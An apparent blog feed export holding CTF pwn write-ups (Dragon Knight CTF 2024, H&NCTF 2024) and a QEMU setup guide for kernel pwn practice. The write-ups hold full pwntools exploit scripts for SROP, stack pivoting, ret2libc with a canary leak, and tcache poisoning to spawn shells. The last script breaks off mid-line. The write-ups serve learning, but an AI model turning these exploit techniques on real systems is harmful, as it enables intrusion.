class="keyword">return</span> info(<span class="string">f&#x27;\033[1;33m<span class="subst">&#123;<span class="string">f&quot;<span class="subst">&#123;s&#125;</span>--&gt;0x<span class="subst">&#123;addr:02x&#125;</span>&quot;</span>&#125;</span>\033[0m&#x27;</span>)</span><br><span class="line"></span><br><span class="line">r   = <span class="keyword">lambda</span> a:   io.recv(a)</span><br><span class="line">ru  = <span class="keyword">lambda</span> a:   io.recvuntil(a)</span><br><span class="line">s   = <span class="keyword">lambda</span> a:   io.send(a)</span><br><span class="line">sa  = <span class="keyword">lambda</span> a,b: io.sendafter(a,b)</span><br><span class="line">sl  = <span class="keyword">lambda</span> a:   io.sendline(a)</span><br><span class="line">sla = <span class="keyword">lambda</span> a,b: io.sendlineafter(a,b)</span><br><span class="line"></span><br><span class="line">io = start()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exp</span>():</span><br><span class="line"></span><br><span class="line">    bss = <span class="number">0x404060</span></span><br><span class="line">    mov_rax_0xf = <span class="number">0x0000000000401193</span></span><br><span class="line">    syscall = <span class="number">0x000000000040118a</span></span><br><span class="line">    flag_addr = bss+<span class="number">0x400</span></span><br><span class="line">    leave_ret = <span class="number">0x000000000040136c</span></span><br><span class="line">    ret = <span class="number">0x0000000000401016</span></span><br><span class="line"></span><br><span class="line">    sigopen = SigreturnFrame()</span><br><span class="line">    sigopen.rax = <span class="number">2</span></span><br><span class="line">    sigopen.rdi = flag_addr</span><br><span class="line">    sigopen.rsi = <span class="number">0</span></span><br><span class="line">    sigopen.rdx = <span class="number">0</span></span><br><span class="line">    sigopen.rsp = bss+<span class="number">0x108</span></span><br><span class="line">    sigopen.rbp = bss+<span class="number">0x108</span></span><br><span class="line">    sigopen.rip = syscall</span><br><span class="line">    </span><br><span class="line">    sigread = SigreturnFrame()</span><br><span class="line">    sigread.rax = <span class="number">0</span></span><br><span class="line">    sigread.rdi = <span class="number">3</span></span><br><span class="line">    sigread.rsi = bss + <span class="number">0x700</span></span><br><span class="line">    sigread.rdx = <span class="number">0x100</span></span><br><span class="line">    sigread.rsp = bss+<span class="number">0x218</span></span><br><span class="line">    sigread.rbp = bss+<span class="number">0x218</span></span><br><span class="line">    sigread.rip = syscall</span><br><span class="line">    </span><br><span class="line">    sigwrite = SigreturnFrame()</span><br><span class="line">    sigwrite.rax = <span class="number">1</span></span><br><span class="line">    sigwrite.rdi = <span class="number">1</span></span><br><span class="line">    sigwrite.rsi = bss + <span class="number">0x700</span></span><br><span class="line">    sigwrite.rdx = <span class="number">0x100</span></span><br><span class="line">    <span class="comment">#sigwrite.rsp = bss+0x320</span></span><br><span class="line">    <span class="comment">#sigwrite.rbp = bss+0x320</span></span><br><span class="line">    sigwrite.rip = syscall</span><br><span class="line"></span><br><span class="line">    pd = p64(mov_rax_0xf)+p64(syscall)</span><br><span class="line">    pd += <span class="built_in">bytes</span>(sigopen)</span><br><span class="line"></span><br><span class="line">    pd += p64(<span class="number">0x1</span>)+p64(mov_rax_0xf)+p64(syscall)</span><br><span class="line">    pd += <span class="built_in">bytes</span>(sigread)</span><br><span class="line"></span><br><span class="line">    pd += p64(<span class="number">0x1</span>)+p64(mov_rax_0xf)+p64(syscall)</span><br><span class="line">    pd += <span class="built_in">bytes</span>(sigwrite)</span><br><span class="line"></span><br><span class="line">    pd = pd.ljust(<span class="number">0x400</span>,<span class="string">b&#x27;\x00&#x27;</span>)+<span class="string">b&#x27;flag\x00&#x27;</span></span><br><span class="line"></span><br><span class="line">    sa(<span class="string">b&#x27;easyhack&#x27;</span>,pd)</span><br><span class="line"></span><br><span class="line">    pd = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x2a</span>+p64(bss-<span class="number">8</span>) + p64(leave_ret)</span><br><span class="line">    sa(<span class="string">b&#x27;SUID?\n&#x27;</span>,pd)</span><br><span class="line"></span><br><span class="line">    io.interactive() </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    exp()</span><br></pre></td></tr></table></figure>]]></content:encoded>
      
      
      <category domain="http://example.com/categories/write-up/">write up</category>
      
      
      
      <comments>http://example.com/2024/05/26/Dragon-Knight-CTF-2024-pwn-wp/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>kernel pwn入门之qemu环境的配置</title>
      <link>http://example.com/2024/05/23/kernel-pwn%E5%85%A5%E9%97%A8%E4%B9%8Bqemu%E7%8E%AF%E5%A2%83%E7%9A%84%E9%85%8D%E7%BD%AE/</link>
      <guid>http://example.com/2024/05/23/kernel-pwn%E5%85%A5%E9%97%A8%E4%B9%8Bqemu%E7%8E%AF%E5%A2%83%E7%9A%84%E9%85%8D%E7%BD%AE/</guid>
      <pubDate>Thu, 23 May 2024 09:33:19 GMT</pubDate>
      
      <description>&lt;p&gt;记录一下自己是如何完成qemu环境配置的，以及在配置环境时遇到的问题及解决方案&lt;/p&gt;</description>
      
      
      
      <content:encoded><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>记录一下自己是如何完成qemu环境配置的，以及在配置环境时遇到的问题及解决方案</p><span id="more"></span><h3 id="环境版本说明"><a href="#环境版本说明" class="headerlink" title="环境版本说明"></a>环境版本说明</h3><p>​ubuntu20.04</p><p>​VMware虚拟机</p><h3 id="qemu安装"><a href="#qemu安装" class="headerlink" title="qemu安装"></a>qemu安装</h3><p>参考文章：<a href="https://arcsin2.cloud/2023/03/03/Ubuntu-22-04-%E5%AE%89%E8%A3%85-QEMU-%E6%B5%81%E7%A8%8B/">Ubuntu 22.04 安装 QEMU 流程 - arcsin2 的个人博客</a></p><h4 id="拉取并解压"><a href="#拉取并解压" class="headerlink" title="拉取并解压"></a>拉取并解压</h4><p>我用 wget 拉取时比较慢，直接复制链接下载完再复制到虚拟机里</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">wget https://download.qemu.org/qemu-7.2.0.tar.xz</span><br><span class="line">tar -zxvf qemu-7.2.0.tar.xz</span><br><span class="line">cd qemu-7.2.0/</span><br></pre></td></tr></table></figure><h4 id="安装依赖"><a href="#安装依赖" class="headerlink" title="安装依赖"></a>安装依赖</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install ninja-build</span><br><span class="line">sudo apt-get install zlib1g zlib1g-dev</span><br><span class="line">sudo apt-get install libglib2.0-dev</span><br><span class="line">sudo apt-get install libpixman-1-dev</span><br></pre></td></tr></table></figure><p>安装libslirp-dev，这个我还不了解是什么，后续深入了解后再补充，没安装的话有些题目启动会报错，一定要在.&#x2F;configure前安装好，不然就得像我一样编译两次(哭了)</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install libslirp-dev</span><br></pre></td></tr></table></figure><p>没安装的话报错如下</p><p>说缺少了user网络后端的支持</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">qemu-system-x86_64: -netdev user,id=t0,: network backend &#x27;user&#x27; is not compiled into this binary</span><br></pre></td></tr></table></figure><h4 id="预处理"><a href="#预处理" class="headerlink" title="预处理"></a>预处理</h4><p>本来是没有后面那个 –enable-slirp 的，加上这个是因为安装了 libslirp-dev</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./configure --enable-slirp</span><br></pre></td></tr></table></figure><h4 id="编译"><a href="#编译" class="headerlink" title="编译"></a>编译</h4><p>此过程大概需要编译30分钟</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">make</span><br></pre></td></tr></table></figure><h4 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo make install</span><br></pre></td></tr></table></figure><h4 id="验证"><a href="#验证" class="headerlink" title="验证"></a>验证</h4><p>输入 qemu- 后按两次 Tab</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">qemu-[Tab][Tab]</span><br></pre></td></tr></table></figure><p>输出如下选择即安装成功</p><p><img src="/imgs/$%7Bfiilename%7D/kernel-pwn%E5%85%A5%E9%97%A8%E4%B9%8Bqemu%E7%8E%AF%E5%A2%83%E7%9A%84%E9%85%8D%E7%BD%AE-1.png"></p><h3 id="运行sh启动脚本时遇到的错误"><a href="#运行sh启动脚本时遇到的错误" class="headerlink" title="运行sh启动脚本时遇到的错误"></a>运行sh启动脚本时遇到的错误</h3><h4 id="报错1"><a href="#报错1" class="headerlink" title="报错1"></a>报错1</h4><p>缺少了libaio.so.1文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./qemu-system-x86_64: error while loading shared libraries: libaio.so.1: cannot open shared object file: No such file or directory</span><br></pre></td></tr></table></figure><p>解决方案</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install libaio1</span><br></pre></td></tr></table></figure><h4 id="报错2"><a href="#报错2" class="headerlink" title="报错2"></a>报错2</h4><p>缺少了libcurl3，我本机的是libcurl4，很多程序都依赖于libcurl4，而且你只能从libcurl3或libcurl4中选择一个进行安装(有种强制爱的感觉)，如果换成了libcurl3，虚拟机大概率是会崩的，不过还是有解决办法的</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./qemu-system-x86_64: /lib/x86_64-linux-gnu/libcurl.so.4: version `CURL_OPENSSL_3&#x27; not found (required by ./qemu-system-x86_64)</span><br></pre></td></tr></table></figure><p>解决方案</p><p>你可以在这里找到如何同时安装libcurl3和libcurl4的方法：</p><p><a href="https://askubuntu.com/questions/1061431/how-to-have-both-libcurl3-and-libcurl4-installed-at-same-time">software installation - How to have both libcurl3 and libcurl4 installed at same time? - Ask Ubuntu</a></p><p>我这里简述一下</p><p>先查看一下版本</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-cache policy libcurl4</span><br></pre></td></tr></table></figure><p>输出如下</p><p><img src="/../imgs/$%7Bfiilename%7D/kernel-pwn%E5%85%A5%E9%97%A8%E4%B9%8Bqemu%E7%8E%AF%E5%A2%83%E7%9A%84%E9%85%8D%E7%BD%AE-2.png"></p><p>因为我已经安装好了libcurl3和libcurl4的包，所以我Installed那里显示的就不是什么7.81.0之类的</p><p>在输出中可以看到有一个名为 7.68.0-1ubuntu2.5ppa1 的包，我们只需安装这个包，就可以同时拥有libcurl3和libcurl4的环境</p><p>直接执行下面的命令，不需要去删除libcurl4</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install libcurl4=7.68.0-1ubuntu2.5ppa1</span><br></pre></td></tr></table></figure><h4 id="报错3"><a href="#报错3" class="headerlink" title="报错3"></a>报错3</h4><p>说无法访问kernel模块，该文件不存在</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Could not access KVM kernel module: No such file or directory</span><br><span class="line">failed to initialize KVM: No such file or directory</span><br></pre></td></tr></table></figure><p>解决方案</p><p>在虚拟机设置中打开 “虚拟化 Inter VT-x&#x2F;EPT 或 AMD-V&#x2F;RVI(V)” 即可</p><p><img src="/../imgs/$%7Bfiilename%7D/kernel-pwn%E5%85%A5%E9%97%A8%E4%B9%8Bqemu%E7%8E%AF%E5%A2%83%E7%9A%84%E9%85%8D%E7%BD%AE-3.png"></p><h3 id="启动设备测试"><a href="#启动设备测试" class="headerlink" title="启动设备测试"></a>启动设备测试</h3><p>我这里用的是 [HITB GSEC2017]BABYQEMU 这道题</p><p>bash中运行启动脚本</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./launch.sh</span><br></pre></td></tr></table></figure><p>得到如下结果，说明设备已经启动成功，可以开始pwn啦</p><p><img src="/../imgs/$%7Bfiilename%7D/kernel-pwn%E5%85%A5%E9%97%A8%E4%B9%8Bqemu%E7%8E%AF%E5%A2%83%E7%9A%84%E9%85%8D%E7%BD%AE-4.png"></p>]]></content:encoded>
      
      
      <category domain="http://example.com/categories/%E7%AC%94%E8%AE%B0/">笔记</category>
      
      
      <category domain="http://example.com/tags/qemu/">qemu</category>
      
      
      <comments>http://example.com/2024/05/23/kernel-pwn%E5%85%A5%E9%97%A8%E4%B9%8Bqemu%E7%8E%AF%E5%A2%83%E7%9A%84%E9%85%8D%E7%BD%AE/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>H&amp;NCTF 2024 pwn 部分题解</title>
      <link>http://example.com/2024/05/13/H-NCTF-2024-pwn-%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/</link>
      <guid>http://example.com/2024/05/13/H-NCTF-2024-pwn-%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/</guid>
      <pubDate>Mon, 13 May 2024 09:52:23 GMT</pubDate>
      
      <description>&lt;p&gt;几十个解的题还是能写出来的，但是几个解和0解的题做不出来，我还是太菜了&lt;/p&gt;</description>
      
      
      
      <content:encoded><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>几十个解的题还是能写出来的，但是几个解和0解的题做不出来，我还是太菜了</p><span id="more"></span><h3 id="close"><a href="#close" class="headerlink" title="close"></a>close</h3><p>重定向就可以了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exec 1&gt;&amp;2</span><br></pre></td></tr></table></figure><h3 id="ez-pwn"><a href="#ez-pwn" class="headerlink" title="ez_pwn"></a>ez_pwn</h3><p>考一个栈迁移，第一个printf泄露栈地址，然后利用程序自带的2个leave ret完成栈迁移</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">local_file = <span class="string">&#x27;../ctf_file/pwn&#x27;</span></span><br><span class="line">libc=ELF(<span class="string">&quot;/home/feichai/glibc-all-in-one/libs/2.23-0ubuntu3_i386/libc.so.6&quot;</span>, checksec = <span class="literal">False</span>)</span><br><span class="line">elf=ELF(local_file)</span><br><span class="line"></span><br><span class="line"><span class="comment">#io = process(local_file)</span></span><br><span class="line">io = remote(<span class="string">&#x27;hnctf.imxbt.cn&#x27;</span>, <span class="number">46959</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">lg</span>(<span class="params">s, addr</span>):</span><br><span class="line">    <span class="keyword">return</span> info(<span class="string">f&#x27;\033[1;33m<span class="subst">&#123;<span class="string">f&quot;<span class="subst">&#123;s&#125;</span>--&gt;0x<span class="subst">&#123;addr:02x&#125;</span>&quot;</span>&#125;</span>\033[0m&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dbg</span>():</span><br><span class="line">    gdbscript = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    b *0x08048616</span></span><br><span class="line"><span class="string">    b *0x08048631</span></span><br><span class="line"><span class="string">    b *0x08048666</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    gdb.attach(io,gdbscript)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line">r   = <span class="keyword">lambda</span> a:   io.recv(a)</span><br><span class="line">ru  = <span class="keyword">lambda</span> a:   io.recvuntil(a)</span><br><span class="line">s   = <span class="keyword">lambda</span> a:   io.send(a)</span><br><span class="line">sa  = <span class="keyword">lambda</span> a,b: io.sendafter(a,b)</span><br><span class="line">sl  = <span class="keyword">lambda</span> a:   io.sendline(a)</span><br><span class="line">sla = <span class="keyword">lambda</span> a,b: io.sendlineafter(a,b)</span><br><span class="line"></span><br><span class="line">system = <span class="number">0x0804857D</span></span><br><span class="line">backdoor = <span class="number">0x08048566</span></span><br><span class="line"></span><br><span class="line">sa(<span class="string">b&#x27;your name?&#x27;</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x2c</span>)</span><br><span class="line">ru(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x2c</span>)</span><br><span class="line">stack_addr = u32(r(<span class="number">4</span>))</span><br><span class="line">lg(<span class="string">&quot;stack_addr&quot;</span>,stack_addr)</span><br><span class="line">input_addr = stack_addr- <span class="number">0x38</span></span><br><span class="line">lg(<span class="string">&quot;input_addr&quot;</span>,input_addr)</span><br><span class="line">s(p32(system)+p32(input_addr+<span class="number">20</span>)*<span class="number">2</span>+<span class="string">b&#x27;sh\x00\x00&#x27;</span>*<span class="number">8</span>+p32(input_addr-<span class="number">4</span>))</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h3 id="idea"><a href="#idea" class="headerlink" title="idea"></a>idea</h3><p>输入-1转化为unsigned int变成大数造成栈溢出，fmt泄露canary，然后就是经典的ret2libc了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">local_file = <span class="string">&#x27;../ctf_file/idea&#x27;</span></span><br><span class="line">libc=ELF(<span class="string">&quot;/home/feichai/ctf_libc/puts_150/libc6-i386_2.23-0ubuntu11.3_amd64.so&quot;</span>, checksec = <span class="literal">False</span>)</span><br><span class="line">elf=ELF(local_file)</span><br><span class="line"></span><br><span class="line">debug = <span class="number">0</span></span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">    io = process(local_file)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = remote(<span class="string">&#x27;hnctf.imxbt.cn&#x27;</span>, <span class="number">48805</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">lg</span>(<span class="params">s, addr</span>):</span><br><span class="line">    <span class="keyword">return</span> info(<span class="string">f&#x27;\033[1;33m<span class="subst">&#123;<span class="string">f&quot;<span class="subst">&#123;s&#125;</span>--&gt;0x<span class="subst">&#123;addr:02x&#125;</span>&quot;</span>&#125;</span>\033[0m&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dbg</span>():</span><br><span class="line">    gdbscript = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    b *0x080486CF</span></span><br><span class="line"><span class="string">    b *0x080486E9</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    gdb.attach(io,gdbscript)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line">r   = <span class="keyword">lambda</span> a:   io.recv(a)</span><br><span class="line">ru  = <span class="keyword">lambda</span> a:   io.recvuntil(a)</span><br><span class="line">s   = <span class="keyword">lambda</span> a:   io.send(a)</span><br><span class="line">sa  = <span class="keyword">lambda</span> a,b: io.sendafter(a,b)</span><br><span class="line">sl  = <span class="keyword">lambda</span> a:   io.sendline(a)</span><br><span class="line">sla = <span class="keyword">lambda</span> a,b: io.sendlineafter(a,b)</span><br><span class="line"></span><br><span class="line">puts_plt = elf.plt.puts</span><br><span class="line">puts_got = elf.got.puts</span><br><span class="line">vuln = elf.sym.vuln</span><br><span class="line"><span class="comment">#dbg()</span></span><br><span class="line">sla(<span class="string">b&#x27;me to read?&#x27;</span>,<span class="string">b&#x27;-1&#x27;</span>)</span><br><span class="line">sla(<span class="string">b&#x27;u a gift!&#x27;</span>,<span class="string">b&#x27;%7$p&#x27;</span>)</span><br><span class="line">ru(<span class="string">b&#x27;0x&#x27;</span>)</span><br><span class="line"><span class="comment">#leak_addr = int(r(8),16)</span></span><br><span class="line"><span class="comment">#libc_addr = leak_addr - libc.sym[b&#x27;__libc_start_main&#x27;] - 247</span></span><br><span class="line">canary = <span class="built_in">int</span>(r(<span class="number">8</span>),<span class="number">16</span>)</span><br><span class="line">lg(<span class="string">&#x27;canary&#x27;</span>,canary)</span><br><span class="line">pd = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x20</span>+p32(canary)+p32(<span class="number">0</span>)*<span class="number">3</span>+p32(puts_plt)+p32(vuln)+p32(puts_got)</span><br><span class="line">sla(<span class="string">b&#x27;bytes of data!\n&#x27;</span>,pd)</span><br><span class="line"></span><br><span class="line">puts_addr = u32(ru(<span class="string">b&#x27;\xf7&#x27;</span>)[-<span class="number">4</span>:])</span><br><span class="line">lg(<span class="string">&#x27;puts_addr&#x27;</span>,puts_addr)</span><br><span class="line">libc_base = puts_addr - libc.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">lg(<span class="string">&#x27;libc_base&#x27;</span>,libc_base)</span><br><span class="line"></span><br><span class="line">libc_system = libc_base + libc.symbols[<span class="string">b&#x27;system&#x27;</span>]</span><br><span class="line">bin_sh_addr = libc_base + <span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh&#x27;</span>))</span><br><span class="line"></span><br><span class="line">sla(<span class="string">b&#x27;me to read?&#x27;</span>,<span class="string">b&#x27;-1&#x27;</span>)</span><br><span class="line">sla(<span class="string">b&#x27;u a gift!&#x27;</span>,<span class="string">b&#x27;aaaa&#x27;</span>)</span><br><span class="line"></span><br><span class="line">pd = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x20</span>+p32(canary)+p32(<span class="number">0</span>)*<span class="number">3</span>+p32(libc_system) + p32(<span class="number">0</span>) +p32(bin_sh_addr)</span><br><span class="line">sla(<span class="string">b&#x27;bytes of data!\n&#x27;</span>,pd)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h3 id="what"><a href="#what" class="headerlink" title="what"></a>what</h3><p>tcache 投毒 + uaf漏洞 + 劫持__malloc_hook，修改__malloc_hook为gadget即可</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;gnome-terminal&#x27;</span>, <span class="string">&#x27;-e&#x27;</span>]</span><br><span class="line">local_file = <span class="string">&#x27;../ctf_file/what&#x27;</span></span><br><span class="line">libc=ELF(<span class="string">&quot;/home/feichai/ctf_file/libc-2.27.so&quot;</span>, checksec = <span class="literal">False</span>)</span><br><span class="line">elf=ELF(local_file)</span><br><span class="line"></span><br><span class="line">debug = <span class="number">0</span></span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">    io = process(local_file)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = remote(<span class="string">&#x27;hnctf.imxbt.cn&#x27;</span>, <span class="number">50228</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">lg</span>(<span class="params">s, addr</span>):</span><br><span class="line">    <span class="keyword">return</span> info(<span class="string">f&#x27;\033[1;33m<span class="subst">&#123;<span class="string">f&quot;<span class="subst">&#123;s&#125;</span>--&gt;0x<span class="subst">&#123;addr:02x&#125;</span>&quot;</span>&#125;</span>\033[0m&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dbg</span>():</span><br><span class="line">    gdbscript = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    gdb.attach(io,gdbscript)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line">r   = <span class="keyword">lambda</span> a:   io.recv(a)</span><br><span class="line">ru  = <span class="keyword">lambda</span> a:   io.recvuntil(a)</span><br><span class="line">s   = <span class="keyword">lambda</span> a:   io.send(a)</span><br><span class="line">sa  = <span class="keyword">lambda</span> a,b: io.sendafter(a,b)</span><br><span class="line">sl  = <span class="keyword">lambda</span> a:   io.sendline(a)</span><br><span class="line">sla = <span class="keyword">lambda</span> a,b: io.sendlineafter(a,b)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">choice</span>(<span class="params">index</span>):</span><br><span class="line">    sla(<span class="string">&#x27;Enter your command:&#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size</span>):</span><br><span class="line">    choice(<span class="number">1</span>)</span><br><span class="line">    sla(<span class="string">&#x27;size:&#x27;</span>,<span class="built_in">str</span>(size))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>():</span><br><span class="line">    choice(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">index</span>):</span><br><span class="line">    choice(<span class="number">3</span>)</span><br><span class="line">    sla(<span 